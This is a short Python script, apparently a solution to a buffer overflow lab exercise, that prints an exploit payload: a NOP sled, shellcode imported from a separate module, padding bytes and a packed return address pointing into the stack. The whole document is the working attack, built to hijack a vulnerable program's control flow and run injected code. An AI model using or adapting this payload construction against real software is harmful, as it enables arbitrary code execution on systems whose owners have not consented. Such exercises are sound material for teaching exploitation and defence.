from shellcode import shellcode
from struct import pack
print(('\x90'*40) + shellcode + ('A'*19) + pack('<I', 0xbffe9b80))
